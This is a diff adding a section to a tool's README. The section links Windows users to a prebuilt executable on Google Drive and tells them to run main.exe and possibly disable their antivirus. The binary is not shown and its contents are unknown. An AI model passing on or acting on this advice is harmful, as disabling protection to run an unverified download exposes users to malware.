@@ -148,6 +148,14 @@ You're now ready to use the tool! 🚀
 
 ---
 
+You can also directly install the executable file and run it on your PC:
+
+1. **Windows**: 
+[Click this link to install the executable file](https://drive.google.com/file/d/1rcmC031Sejf7wzWlYnavOkwnLjkLU4RA/view?usp=sharing) 
+After downloading it, unzip it and open `main.exe`. You may need to disable your antivirus while using this.
+
+---
+
 ## 🚀 How the Tool Works (Behind the Scenes)
 
 1. **Detects Hardware** – Uses GPU if available.
